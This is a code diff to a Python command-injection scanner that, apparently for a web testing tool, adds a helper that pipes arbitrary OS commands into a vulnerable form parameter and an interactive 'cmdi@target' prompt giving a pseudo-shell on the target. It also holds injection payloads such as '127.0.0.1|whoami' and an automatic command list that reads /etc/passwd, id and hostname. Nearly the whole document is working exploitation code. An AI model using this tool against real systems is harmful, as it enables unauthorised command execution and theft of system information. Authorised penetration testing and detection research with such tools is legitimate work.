@@ -19,22 +19,12 @@ class CommandInjectionScanner:
             return clean
         return None
 
-    # ─────────────────────────────────────────────
-    # DETECTION — two-step verification to kill false positives
-    # ─────────────────────────────────────────────
-    # Step 1: echo a unique token, check it appears in response
-    # Step 2: verify by running 'whoami' and checking the output
-    #         looks like a real Linux username (not our injected string)
-    #         This kills false positives from pages that just reflect input
     def detect(self, url, method, param_name, base_params):
         token = "CMDINJX_9f3a"
-
         for sep in self.SEPARATORS:
-            # Step 1 — token echo test
             payload = f"127.0.0.1{sep}echo {token}"
             test_params = base_params.copy()
             test_params[param_name] = payload
-
             try:
                 if method == "post":
                     resp = self.session.post(url, data=test_params, timeout=15)
@@ -46,14 +36,8 @@ class CommandInjectionScanner:
             if token not in resp.text:
                 continue
 
-            # Step 2 — verification: inject whoami and check the response
-            # contains something that looks like a real Linux username
-            # (lowercase word 1-32 chars, possibly with hyphens/underscores)
-            # A page that just reflects input would show "127.0.0.1|whoami"
-            # back literally — not an actual username
             verify_params = base_params.copy()
             verify_params[param_name] = f"nonexistent_host_xyz|whoami"
-
             try:
                 if method == "post":
                     verify_resp = self.session.post(url, data=verify_params, timeout=15)
@@ -63,38 +47,37 @@ class CommandInjectionScanner:
                 continue
 
             output = self._extract_output(verify_resp.text)
-            page_text = verify_resp.text
-
-            # Real whoami output: a short word like "www-data", "root",
-            # "apache" appearing in the response without our injection
-            # string surrounding it — use regex to find a standalone word
-            # that could plausibly be a Linux username
             username_pattern = re.search(
                 r'\b(root|www-data|apache|nginx|nobody|daemon|[a-z][a-z0-9_-]{1,30})\b',
                 output or ""
             )
-
-            # Also reject if the response literally echoes back our
-            # injection string — that's a reflection, not execution
             if username_pattern and "nonexistent_host_xyz" not in (output or ""):
                 print(f"{Fore.RED}[!] Command injection CONFIRMED -> {url} "
                       f"param='{param_name}' separator='{sep}' "
                       f"verified as: '{username_pattern.group(1)}'")
                 return {"separator": sep, "param": param_name,
                         "verified_user": username_pattern.group(1)}
-
         return None
 
-    # ─────────────────────────────────────────────
-    # EXPLOITATION — use pipe (|) to suppress ping output
-    # and show ONLY our command's result cleanly
-    # ─────────────────────────────────────────────
+    def run_command(self, url, method, param_name, base_params, cmd):
+        payload = f"127.0.0.1 | {cmd}"
+        test_params = base_params.copy()
+        test_params[param_name] = payload
+        try:
+            if method == "post":
+                resp = self.session.post(url, data=test_params, timeout=15)
+            else:
+                resp = self.session.get(url, params=test_params, timeout=15)
+            return self._extract_output(resp.text)
+        except requests.exceptions.RequestException:
+            return None
+
     def exploit(self, url, method, param_name, base_params, separator):
         print(f"\n{Fore.CYAN}{'='*55}")
         print(f"{Fore.CYAN}   COMMAND INJECTION EXPLOITATION -> {url}")
         print(f"{Fore.CYAN}{'='*55}\n")
 
-        commands = {
+        auto_commands = {
             "whoami":          "web server process user",
             "id":              "full user/group context",
             "hostname":        "target hostname",
@@ -102,37 +85,48 @@ class CommandInjectionScanner:
             "cat /etc/passwd": "local system users"
         }
 
-        exploitation_results = {}
+        results = {}
 
-        for cmd, description in commands.items():
-            # Use | for exploitation regardless of which separator
-            # was used for detection — pipe suppresses the ping output
-            # completely and returns ONLY the injected command's stdout
-            payload = f"127.0.0.1 | {cmd}"
-            test_params = base_params.copy()
-            test_params[param_name] = payload
-
-            try:
-                if method == "post":
-                    resp = self.session.post(url, data=test_params, timeout=15)
-                else:
-                    resp = self.session.get(url, params=test_params, timeout=15)
-            except requests.exceptions.RequestException:
-                continue
-
-            output = self._extract_output(resp.text)
-
-            if output and len(output.strip()) > 0:
-                clean_output = output.strip()[:300]
+        for cmd, description in auto_commands.items():
+            output = self.run_command(url, method, param_name, base_params, cmd)
+            if output:
                 print(f"{Fore.RED}[+] {cmd:<22} -> {description}")
-                for line in clean_output.split('\n')[:5]:
+                for line in output.split('\n')[:5]:
                     if line.strip():
                         print(f"{Fore.YELLOW}    {line.strip()}")
-                exploitation_results[cmd] = clean_output
+                results[cmd] = output
             else:
                 print(f"{Fore.YELLOW}[?] {cmd:<22} -> no output captured")
 
-        return exploitation_results
+        # ── Interactive command prompt ────────────────────────
+        print(f"\n{Fore.CYAN}{'='*55}")
+        print(f"{Fore.CYAN}   INTERACTIVE COMMAND INJECTION")
+        print(f"{Fore.CYAN}   Injecting into: {url}  param='{param_name}'")
+        print(f"{Fore.CYAN}   Type OS commands. 'exit' to continue scan.")
+        print(f"{Fore.CYAN}{'='*55}\n")
+
+        while True:
+            try:
+                cmd = input(f"{Fore.RED}cmdi{Fore.WHITE}@{Fore.YELLOW}target{Fore.WHITE}> ").strip()
+            except (KeyboardInterrupt, EOFError):
+                print()
+                break
+
+            if not cmd:
+                continue
+
+            if cmd.lower() in ("exit", "quit", "q"):
+                print(f"{Fore.CYAN}[*] Exiting interactive mode...")
+                break
+
+            output = self.run_command(url, method, param_name, base_params, cmd)
+            if output:
+                print(f"{Fore.WHITE}{output}")
+                results[f"[interactive] {cmd}"] = output
+            else:
+                print(f"{Fore.YELLOW}[?] No output returned")
+
+        return results
 
     def scan_all(self, discovered_forms):
         print(f"\n{Fore.CYAN}{'='*55}")
